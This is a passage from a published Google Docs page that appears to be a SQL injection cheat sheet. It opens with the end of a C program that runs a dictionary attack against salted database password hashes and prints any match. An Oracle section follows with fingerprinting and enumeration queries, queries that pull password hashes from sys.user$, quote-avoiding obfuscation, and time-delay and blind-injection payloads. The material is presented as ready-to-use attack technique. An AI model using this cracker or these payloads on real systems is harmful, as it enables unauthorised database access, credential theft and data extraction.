&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;{</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp;
 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
&nbsp; &nbsp; &nbsp;// KeySet does not exist. So create a new keyset</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp;
 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
&nbsp; &nbsp; &nbsp;if(!CryptAcquireContext(&amp;hProv,</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp;
 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
&nbsp; &nbsp; &nbsp; NULL,</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp;
 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
&nbsp; &nbsp; &nbsp; NULL,</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp;
 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
&nbsp; &nbsp; &nbsp; PROV_RSA_FULL,</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp;
 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
&nbsp; &nbsp; &nbsp; CRYPT_NEWKEYSET ))</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; {</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp;
 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
&nbsp;printf("FAILLLLLLL!!!");</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp;
 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;return 
FALSE;</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }</font></font></div><div><font size="1"><font face="'Courier New'">}</font></font></div><div><font size="1"><font face="'Courier New'">while(1)</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; {</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // get a word to try from the file</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ZeroMemory(wttf,44);</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if(!fgets(wttf,40,fd))</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;return printf("\nEnd of password file. Didn't find the password.\n");</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; wd++;</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; len = strlen(wttf);</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; wttf[len-1]=0x00;</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ZeroMemory(uwttf,84);</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // Convert the word to UNICODE</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; while(count &lt; len)</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; {</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp;
 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
&nbsp; &nbsp; &nbsp; &nbsp; uwttf[cnt]=wttf[count];</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; cnt++;</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; uwttf[cnt]=0x00;</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; count++;</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; cnt++;</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; len --;</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; wp = &amp;uwttf;</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; sscanf(pkey,"%x",&amp;key);</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; cnt = cnt - 2;</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // Append the random stuff to the end of</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // the uppercase unicode password</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; t = key &gt;&gt; 24;</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; x = (unsigned char) t;</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; uwttf[cnt]=x;</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; cnt++;</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; t = key &lt;&lt; 8;</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; t = t &gt;&gt; 24;</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; x = (unsigned char) t;</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; uwttf[cnt]=x;</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; cnt++;</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; t = key &lt;&lt; 16;</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; t = t &gt;&gt; 24;</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; x = (unsigned char) t;</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; uwttf[cnt]=x;</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; cnt++;</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; t = key &lt;&lt; 24;</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; t = t &gt;&gt; 24;</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; x = (unsigned char) t;</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; uwttf[cnt]=x;</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; cnt++;</font></font></div><div><font size="1"><font face="'Courier New'">// Create the hash</font></font></div><div><font size="1"><font face="'Courier New'">if(!CryptCreateHash(hProv, CALG_SHA, 0 , 0, &amp;hHash))</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; {</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp;
 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; printf("Error 
%x during CryptCreatHash!\n", GetLastError());</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; return 0;</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; }</font></font></div><div><font size="1"><font face="'Courier New'">if(!CryptHashData(hHash, (BYTE *)uwttf, len*2+4, 0))</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; {</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; printf("Error %x during CryptHashData!\n", GetLastError());</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; return FALSE;</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; }</font></font></div><div><font size="1"><font face="'Courier New'">CryptGetHashParam(hHash,HP_HASHVAL,(byte*)szhash,&amp;hl,0);</font></font></div><div><font size="1"><font face="'Courier New'">// Test the first byte only. Much quicker.</font></font></div><div><font size="1"><font face="'Courier New'">if(szhash[0] == cmp)</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; {</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // If first byte matches try the rest</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ptr = pucase;</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; cnt = 1;</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; while(cnt &lt; 20)</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; {</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ptr = ptr + 2;</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp;
 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
&nbsp; &nbsp; &nbsp; &nbsp; strncpy(pucfirst,ptr,2);</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp;
 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
&nbsp; &nbsp; &nbsp; &nbsp; sscanf(pucfirst,"%x",&amp;cmp);</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp;
 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
&nbsp; &nbsp; &nbsp; &nbsp; if(szhash[cnt]==cmp)</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp;
 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;cnt ++;</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; else</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; {</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp;
 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;break;</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if(cnt == 20)</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; {</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;// We've found the password</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp;
 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
&nbsp;printf("\nA MATCH!!! Password is %s\n",wttf);</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;return 0;</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; count = 0;</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; cnt=0;</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }</font></font></div><div><font size="1"><font face="'Courier New'">&nbsp;&nbsp;return 0;</font></font></div><div><font size="1"><font face="'Courier New'">}</font></font></div><br><br><h2><a id="ORACLE_07722236053086817_05771" name="ORACLE_07722236053086817_05771"></a><b>ORACLE</b></h2><b><br></b><h3><a id="Default_Databases_835670871427_3261308385365387" name="Default_Databases_835670871427_3261308385365387"></a><font size="3"><b>Default Databases</b></font></h3><ul><li><font size="3"><font color="#333333">SYSTEM</font></font></li><li><font size="3"><font color="#333333">SYSAUX</font></font></li></ul><br><h3><a id="Comment_Out_Query_147209078262" name="Comment_Out_Query_147209078262"></a><font size="3"><b>Comment Out Query</b></font></h3><ul style="font-family: 'Courier New';"><li><font size="3">--</font></li></ul><br><h3><a id="Testing_Version_45404268473343" name="Testing_Version_45404268473343"></a><font size="3"><b>Testing Version</b></font></h3><ul><li><font color="#333333"><font size="3"><font face="'Courier New'">SELECT banner FROM v$version WHERE banner LIKE 'Oracle%'</font></font></font></li><li><font color="#333333"><font size="3"><font face="'Courier New'">SELECT banner FROM v$version WHERE banner LIKE 'TNS%'</font></font></font></li><li><font color="#333333"><font size="3"><font face="'Courier New'">SELECT version FROM v$instance</font></font></font></li></ul><br><h3><a id="Retrieving_Users_Passwords_589_1155335966680564" name="Retrieving_Users_Passwords_589_1155335966680564"></a>Database Credentials</h3><ul><li><font face="'Courier New'">SELECT username FROM all_users</font></li><li><font face="'Courier New'">SELECT name, password from sys.user$ </font>(Privileged, &lt;= 10g)</li><li><font face="'Courier New'">SELECT name, spare4 from sys.user$ </font>(Privileged, &lt;= 11g)</li></ul><br><h3><a id="Retrieving_Databases_508238462_7729031428724391" name="Retrieving_Databases_508238462_7729031428724391"></a>Database Names</h3><h4><a id="Current_Database_4848270732909_6606606173680046" name="Current_Database_4848270732909_6606606173680046"></a>Current Database</h4><ul><li><font color="#333333"><font size="3"><font face="'Courier New'">SELECT name FROM v$database;</font></font></font></li><li><font color="#333333"><font size="3"><font face="'Courier New'">SELECT instance_name FROM v$instance</font></font></font></li><li><font color="#333333"><font size="3"><font face="'Courier New'">SELECT global_name FROM global_name</font></font></font></li><li><font color="#333333"><font size="3"><font face="'Courier New'">SELECT SYS.DATABASE_NAME FROM DUAL</font></font></font></li></ul><font size="3"><br></font><h4><a id="User_Databases_772196189267560_6847389760974008" name="User_Databases_772196189267560_6847389760974008"></a><b>User Databases</b></h4><p></p><ul><li><font size="3"><font face="'courier new'"><font color="#333333">SELECT DISTINCT owner FROM all_tables;&nbsp;</font></font></font></li></ul><font size="3"><br></font><p></p><h3><a id="Retrieving_Tables_Columns_0685_8079150577052975" name="Retrieving_Tables_Columns_0685_8079150577052975"></a>Tables &amp; Columns</h3><h4><a id="Retrieving_Tables_928967117331" name="Retrieving_Tables_928967117331"></a>Retrieving Tables</h4><ul><li><font face="'Courier New'">SELECT table_name FROM all_tables</font></li></ul><br><h4><a id="Retrieving_Columns_94002029672_25307474183440437" name="Retrieving_Columns_94002029672_25307474183440437"></a>Retrieving Columns</h4><ul><li><font face="'courier new'">SELECT column_name FROM all_tab_columns</font></li></ul><br><h4><a id="Finding_Tables_from_Column_Nam_44700741806267885" name="Finding_Tables_from_Column_Nam_44700741806267885"></a>Finding Tables from Column Name</h4><ul><li><font face="'Courier New'">SELECT column_name FROM all_tab_columns WHERE table_name = '<i>Users</i>'</font></li></ul><br><h4><a id="Finding_Column_From_Table_Name_5853406596825301" name="Finding_Column_From_Table_Name_5853406596825301"></a>Finding Column From Table Name</h4><ul><li><font face="'Courier New'">SELECT table_name FROM all_tab_tables WHERE column_name = '<i>password</i>'</font></li></ul><br><h3><a id="Obfuscation_7676919663790613_8" name="Obfuscation_7676919663790613_8"></a>Fuzzing and Obfuscation</h3><h4><a id="Avoiding_the_use_of_single_dou" name="Avoiding_the_use_of_single_dou"></a>Avoiding the use of single/double quotations</h4><p>Unlike other RDBMS, Oracle allows us to reference table/column names encoded.</p><br><ul><li><font face="'Courier New'">SELECT chr(32)||chr(92)||chr(93) FROM dual</font></li><li><font face="'Courier New'">SELECT 0x09120911091</font></li></ul><ol class="writely-toc-none writely-toc-subheading" style="list-style-type: none; margin-left: 0pt;"><li><br></li><ol class="writely-toc-none writely-toc-subheading" style="list-style-type: none; margin-left: 0pt;"></ol></ol><h3><a id="Out_Of_Band_Channeling_9292138_0905267475869952" name="Out_Of_Band_Channeling_9292138_0905267475869952"></a>Out Of Band Channeling</h3><h4><a id="_Time_Delay_07622388936579227_" name="_Time_Delay_07622388936579227_"></a>&nbsp;&nbsp; &nbsp;Time Delay</h4><ul><li><font size="3"><font face="'Courier New'">SELECT UTL_INADDR.get_host_address('<i>non-existant-domain.com</i>') FROM dual</font></font></li></ul><font size="3"><br></font><h4><a id="_Heavy_Query_Time_delays_08850_14402908531386716" name="_Heavy_Query_Time_delays_08850_14402908531386716"></a>&nbsp;&nbsp; &nbsp;Heavy Query Time delays</h4><ul><li><font face="'Courier New'">AND
 (SELECT COUNT(*) FROM all_users t1, all_users t2, all_users t3, 
all_users t4, all_users t5) &gt; 0 AND 300 &gt; ASCII(SUBSTR((SELECT 
username FROM all_users WHERE rownum = 1),1,1))</font><br></li></ul><br><br><br><br><br><br><br></div><br>
<br clear="all">
</div>
<div id="google-view-footer">
<div id="maybecanedit" style="float: right;">
<a class="google-small-link" id="editpermissionlink" href="https://docs.google.com/Doc?tab=edit&amp;dr=true&amp;id=dccjzmm_8gnrhrf29" title="Edit this page">
Edit this page (if you have permission)</a>
<span style="color: rgb(103, 103, 103);">|</span>
<a class="google-small-link" id="report-abuse-link" href="https://docs.google.com/abuse?id=0AZNlBave77hiZGNjanptbV84Z25yaHJmMjk">
Report abuse</a>
</div>
<div style="float: left;">
<a title="Learn more about Google Docs" class="google-small-link" href="https://docs.google.com/">
Google Docs -- Web word processing, presentations and spreadsheets.</a>
</div>
<p> &nbsp;
</p></div>
<script><!--
    viewOnLoad();
    if(window.jstiming){window.jstiming.a={};window.jstiming.b=1;var k=function(c,a,f){var b=c.t[a],g=c.t.start;if(b&&(g||f))return b=c.t[a][0],f!=void 0?g=f:g=g[0],b-g},n=function(c,a,f){var b="";window.jstiming.pt&&(b+="&srt="+window.jstiming.pt,delete window.jstiming.pt);try{window.external&&window.external.tran?b+="&tran="+window.external.tran:window.gtbExternal&&window.gtbExternal.tran?b+="&tran="+window.gtbExternal.tran():window.chrome&&window.chrome.csi&&(b+="&tran="+window.chrome.csi().tran)}catch(g){}var d=
window.chrome;if(d&&(d=d.loadTimes))d().wasFetchedViaSpdy&&(b+="&p=s"),d().wasNpnNegotiated&&(b+="&npn=1"),d().wasAlternateProtocolAvailable&&(b+="&apa=1");c.c&&(b+="&"+c.c);var h=c.t,m=h.start,d=[],i=[],e;for(e in h)if(e!="start"&&e.indexOf("_")!=0){var j=h[e][1];j?h[j]&&i.push(e+"."+k(c,e,h[j][0])):m&&d.push(e+"."+k(c,e))}delete h.start;if(a)for(var l in a)b+="&"+l+"="+a[l];(a=f)||(a="https:"==document.location.protocol?"https://csi.gstatic.com/csi":"http://csi.gstatic.com/csi");return[a,"?v=3",
"&s="+(window.jstiming.sn||"writely")+"&action=",c.name,i.length?"&it="+i.join(","):"","",b,"&rt=",d.join(",")].join("")};window.jstiming.report=function(c,a,f){c=n(c,a,f);if(!c)return"";var a=new Image,b=window.jstiming.b++;window.jstiming.a[b]=a;a.onload=a.onerror=function(){delete window.jstiming.a[b]};a.src=c;a=null;return c}};

    window.jstiming.load.name = 'published';
    
    
    var urchinPage = "/View";

    
    function getXHR() {
      if (typeof XMLHttpRequest != "undefined") {
        return new XMLHttpRequest();
      }
      try { return new ActiveXObject("Msxml2.XMLHTTP.6.0") } catch(e) {}
      try { return new ActiveXObject("Msxml2.XMLHTTP.3.0") } catch(e) {}
      try { return new ActiveXObject("Msxml2.XMLHTTP") } catch(e) {}
      try { return new ActiveXObject("Microsoft.XMLHTTP") } catch(e) {}
      return null;
    }
  --></script>
</body></html>